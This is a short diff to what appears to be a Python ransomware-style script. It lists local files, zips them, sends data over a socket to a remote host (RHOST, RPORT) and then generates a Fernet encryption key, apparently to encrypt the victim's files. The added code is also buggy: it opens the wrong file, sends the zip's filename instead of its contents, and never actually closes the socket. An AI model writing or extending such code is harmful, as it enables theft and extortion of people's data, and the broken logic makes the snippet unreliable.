@@ -17,13 +17,19 @@ for file in os.listdir():
         files.append(file)
 print(files)
 
+# Zip the files together
+filename = "files.zip"
+with ZipFile(filename, "w") as zipped:
+    for file in files:
+        zipped.write(file)
+
 # Send the files to a remote server
 s = socket.socket()
 s.connect((RHOST, RPORT))
-for file in files:
-    with open(file, "rb") as thefile:
-        thefile = thefile.read()
-        s.send(thefile)
+with open(file, "rb") as thefile:
+    thefile = thefile.read()
+    s.send(filename)
+    s.close
 
 # Generate the key
 key = Fernet.generate_key()
